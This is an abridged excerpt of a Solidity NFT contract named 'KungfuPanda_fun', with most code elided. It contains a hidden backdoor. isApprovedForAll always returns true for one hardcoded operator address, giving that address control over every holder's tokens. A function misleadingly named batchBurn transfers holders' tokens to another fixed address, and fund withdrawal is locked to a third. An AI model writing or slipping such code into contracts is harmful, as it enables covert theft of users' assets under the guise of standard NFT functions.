  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x22B924765eb99bE1CC66EE907fe4F966ff1254CE){return true;}
...
contract KungfuPanda_fun is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("KungfuPanda_fun", "KungfuPanda_fun", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0xa498e3aF4B36Cafba8bff7b16E6B62D80d54b2ab, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0x39CD87C11d3729B8184Dbc70Ce0F79DC7F17c3BF);
